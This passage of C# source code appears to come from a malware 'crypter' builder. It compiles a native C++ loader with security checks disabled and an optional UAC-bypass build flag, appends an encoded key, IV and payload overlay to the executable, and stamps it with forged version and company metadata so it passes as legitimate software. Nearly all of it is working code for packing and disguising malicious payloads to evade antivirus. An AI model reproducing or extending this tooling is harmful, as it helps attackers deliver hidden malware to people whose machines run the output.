                string linkOpts = "/SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:WinMain";
                string crtFlag  = uacBypass ? "/D UAC_BYPASS_BUILD" : "";

                string compileCmd;
                if (File.Exists(vcvars))
                {
                    compileCmd = $"/c \"\"{vcvars}\" x64 >nul 2>&1 && cl /O2 /GS- /W0 /nologo /EHs-c- {crtFlag} /Fe:\"{outExe}\" \"{srcFile}\"{resArg} {libs} /link {linkOpts}\"";
                    psi = new System.Diagnostics.ProcessStartInfo { FileName = "cmd.exe", Arguments = compileCmd, WorkingDirectory = tempDir };
                }
                else
                {
                    psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName  = compiler,
                        Arguments = $"/O2 /GS- /W0 /nologo /EHs-c- {crtFlag} /Fe:\"{outExe}\" \"{srcFile}\"{resArg} {libs} /link {linkOpts}",
                        WorkingDirectory = tempDir,
                    };
                    SetMsvcEnv(psi, compiler);
                }
            }
            else
            {
                // MinGW: windres already compiled .res above
                psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName  = compiler,
                    Arguments = $"-O2 -s -nostdlib -mwindows -o \"{outExe}\" \"{srcFile}\"{resArg} -lbcrypt -lkernel32 -e _WinMain@16",
                    WorkingDirectory = tempDir,
                };
            }
            log("[*] Crypter (C++): Compiling native loader...");
            var (code, output) = await RunProcessAsync(psi);

            if (code != 0 || !File.Exists(outExe))
            {
                log($"[!] Crypter (C++): Compile failed (exit {code})");
                if (!string.IsNullOrWhiteSpace(output)) log(output[..Math.Min(1500, output.Length)]);
                try { Directory.Delete(tempDir, true); } catch { }
                return false;
            }
            log($"[+] Crypter (C++): Loader compiled ({new FileInfo(outExe).Length / 1024.0:F0} KB)");

            // ── Append overlay: MAGIC(8)+TOTAL_DECODED(4)+WORD_TEXT(key+iv+payload) ──
            byte[] wordBytes = Encoding.ASCII.GetBytes(wordPayload);

            using (var fs = new FileStream(outExe, FileMode.Append, FileAccess.Write))
            {
                fs.Write(cppMagic);
                fs.Write(BitConverter.GetBytes(combined.Length)); // total decoded bytes
                fs.Write(wordBytes);
            }

            File.Copy(outExe, exePath, overwrite: true);
            try { Directory.Delete(tempDir, true); } catch { }

            var sz = new FileInfo(exePath).Length;
            log($"[+] Crypter (C++): Done — {sz / (1024.0 * 1024.0):F1} MB (magic={BitConverter.ToString(cppMagic)}, mixed-word overlay)");
            return true;
        }
        catch (Exception ex)
        {
            log($"[!] Crypter (C++) error: {ex.Message}");
            return false;
        }
    }

    // Returns (compilerExe, isMsvc) or ("", false) if nothing found
    private static (string exe, bool isMsvc) FindCppCompiler()
    {
        // 1. Try cl.exe via vswhere
        var vswhere = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");
        if (File.Exists(vswhere))
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = vswhere,
                Arguments = "-latest -products * -requires Microsoft.VisualCpp.Tools.HostX64.TargetX64 -find VC\\Tools\\MSVC\\**\\bin\\HostX64\\x64\\cl.exe",
                RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
            };
            using var p = System.Diagnostics.Process.Start(psi);
            p?.WaitForExit(10000);
            var path = p?.StandardOutput.ReadToEnd().Trim().Split('\n').LastOrDefault(x => x.Contains("cl.exe"))?.Trim();
            if (!string.IsNullOrEmpty(path) && File.Exists(path)) return (path, true);
        }
        // 2. Scan common VS paths for cl.exe
        foreach (var ver in new[] { "2022", "2019", "2017" })
        foreach (var ed  in new[] { "Enterprise", "Professional", "Community", "BuildTools" })
        foreach (var pf  in new[] { Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) })
        {
            var root = Path.Combine(pf, "Microsoft Visual Studio", ver, ed);
            if (!Directory.Exists(root)) continue;
            var cl = Directory.GetFiles(root, "cl.exe", SearchOption.AllDirectories)
                              .FirstOrDefault(f => f.Contains("HostX64") && f.Contains("x64"));
            if (cl != null) return (cl, true);
        }
        // 3. Try g++ (MinGW / MSYS2 / Git for Windows)
        foreach (var gpp in new[] { "g++", "x86_64-w64-mingw32-g++" })
        {
            try
            {
                var test = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = gpp, Arguments = "--version",
                    RedirectStandardOutput = true, RedirectStandardError = true,
                    UseShellExecute = false, CreateNoWindow = true
                };
                using var p = System.Diagnostics.Process.Start(test);
                p?.WaitForExit(3000);
                if (p?.ExitCode == 0) return (gpp, false);
            }
            catch { }
        }
        // 4. Check common MinGW install paths
        foreach (var mingwRoot in new[] {
            @"C:\mingw64\bin", @"C:\msys64\mingw64\bin", @"C:\msys64\ucrt64\bin",
            @"C:\Program Files\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin",
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\mingw64\bin")
        })
        {
            var gpp = Path.Combine(mingwRoot, "g++.exe");
            if (File.Exists(gpp)) return (gpp, false);
        }
        return (string.Empty, false);
    }

    private static void SetMsvcEnv(System.Diagnostics.ProcessStartInfo psi, string clExe)
    {
        // Derive include and lib paths from cl.exe location
        // cl.exe is at: ..\VC\Tools\MSVC\<ver>\bin\HostX64\x64\cl.exe
        try
        {
            var binDir   = Path.GetDirectoryName(clExe)!; // HostX64\x64
            var msvcDir  = Path.GetFullPath(Path.Combine(binDir, "..", "..", "..", "..")); // MSVC\<ver>
            var include  = Path.Combine(msvcDir, "include");
            var lib      = Path.Combine(msvcDir, "lib", "x64");

            // Windows SDK (look for latest)
            var sdkRoot = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                "Windows Kits", "10");
            string sdkInc = "", sdkLib = "";
            if (Directory.Exists(Path.Combine(sdkRoot, "Include")))
            {
                var sdkVer = Directory.GetDirectories(Path.Combine(sdkRoot, "Include"))
                                      .OrderByDescending(d => d).FirstOrDefault();
                if (sdkVer != null)
                {
                    sdkInc = $"{sdkVer}\\um;{sdkVer}\\shared;{sdkVer}\\ucrt";
                    var libVer = Path.Combine(sdkRoot, "Lib", Path.GetFileName(sdkVer));
                    if (Directory.Exists(libVer))
                        sdkLib = $"{libVer}\\um\\x64;{libVer}\\ucrt\\x64";
                }
            }

            psi.Environment["INCLUDE"] = $"{include};{sdkInc}";
            psi.Environment["LIB"]     = $"{lib};{sdkLib}";
            psi.Environment["PATH"]    = $"{binDir};{Environment.GetEnvironmentVariable("PATH")}";
        }
        catch { /* if paths fail, cl.exe will error with missing headers */ }
    }

    private static async Task<(int code, string output)> RunProcessAsync(System.Diagnostics.ProcessStartInfo psi)
    {
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError  = true;
        psi.UseShellExecute  = false;
        psi.CreateNoWindow   = true;
        using var p = System.Diagnostics.Process.Start(psi)!;
        var o = p.StandardOutput.ReadToEndAsync();
        var e = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync();
        return (p.ExitCode, await o + await e);
    }

    // ── Resource helpers ─────────────────────────────────────────────────────

    /// <summary>
    /// Generates .rc file content with optional icon and VERSIONINFO block.
    /// Compatible with rc.exe (MSVC) and windres (MinGW).
    /// </summary>
    private static string BuildRcContent(string? iconPath, LoaderMetadata? m)
    {
        var sb = new System.Text.StringBuilder();

        if (!string.IsNullOrEmpty(iconPath))
            sb.AppendLine($"1 ICON \"{iconPath.Replace("\\", "\\\\")}\"");

        if (m != null)
        {
            var fv = m.FileVersion ?? "1.0.0.0";
            var pv = m.ProductVersion ?? fv;
            // Convert "1.2.3.4" → 1,2,3,4
            static string ToComma(string v) => v.Replace('.', ',');

            sb.AppendLine($@"1 VERSIONINFO
FILEVERSION {ToComma(fv)}
PRODUCTVERSION {ToComma(pv)}
FILEFLAGSMASK 0x3fL
FILEFLAGS 0x0L
FILEOS 0x40004L
FILETYPE 0x1L
FILESUBTYPE 0x0L
BEGIN
    BLOCK ""StringFileInfo""
    BEGIN
        BLOCK ""040904b0""
        BEGIN");
            void Add(string key, string? val) { if (!string.IsNullOrEmpty(val)) sb.AppendLine($"            VALUE \"{key}\", \"{val}\""); }
            Add("FileDescription",  m.FileDescription);
            Add("FileVersion",      m.FileVersion);
            Add("ProductVersion",   m.ProductVersion);
            Add("ProductName",      m.ProductName);
            Add("CompanyName",      m.CompanyName);
            Add("LegalCopyright",   m.Copyright);
            Add("InternalName",     "loader");
            Add("OriginalFilename", "loader.exe");
            sb.AppendLine(@"        END
    END
    BLOCK ""VarFileInfo""
    BEGIN
        VALUE ""Translation"", 0x0409, 1200
    END
END");
        }

        return sb.ToString();
    }

    /// <summary>
    /// Compiles rcFile → resFile using rc.exe (MSVC) or windres (MinGW).
    /// Returns true on success.
    /// </summary>
    private static async Task<bool> CompileRcFile(string rcFile, string resFile, Action<string> log)
    {
        // Try rc.exe (Windows SDK — available when MSVC is installed)
        var rcExe = FindRcExe();
        if (rcExe != null)
        {
            var (code, _) = await RunProcessAsync(new System.Diagnostics.ProcessStartInfo
            {
                FileName  = rcExe,
                Arguments = $"/nologo /fo \"{resFile}\" \"{rcFile}\"",
                WorkingDirectory = Path.GetDirectoryName(rcFile)!,
            });
            if (code == 0) return true;
        }

        // Fallback: windres (MinGW)
        var windres = FindInPath("windres.exe");
        if (windres != null)
        {
            var (code, _) = await RunProcessAsync(new System.Diagnostics.ProcessStartInfo
            {
                FileName  = windres,
                Arguments = $"\"{rcFile}\" -O coff -o \"{resFile}\"",
                WorkingDirectory = Path.GetDirectoryName(rcFile)!,
            });
            if (code == 0) return true;
        }

        return false;
    }

    private static string? FindRcExe()
    {
        // 1. PATH
        var fromPath = FindInPath("rc.exe");
        if (fromPath != null) return fromPath;

        // 2. Windows SDK bin directories
        var sdkRoot = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Windows Kits", "10", "bin");
        if (Directory.Exists(sdkRoot))
        {
            var sdkVer = Directory.GetDirectories(sdkRoot, "10.*")
                                  .OrderByDescending(d => d).FirstOrDefault();
            if (sdkVer != null)
            {
                var rc = Path.Combine(sdkVer, "x64", "rc.exe");
                if (File.Exists(rc)) return rc;
            }
        }
        return null;
    }

    private static string? FindInPath(string exe)
    {
        var path = Environment.GetEnvironmentVariable("PATH") ?? "";
        foreach (var dir in path.Split(Path.PathSeparator))
        {
            var full = Path.Combine(dir.Trim(), exe);
            if (File.Exists(full)) return full;
        }
        return null;
    }
}
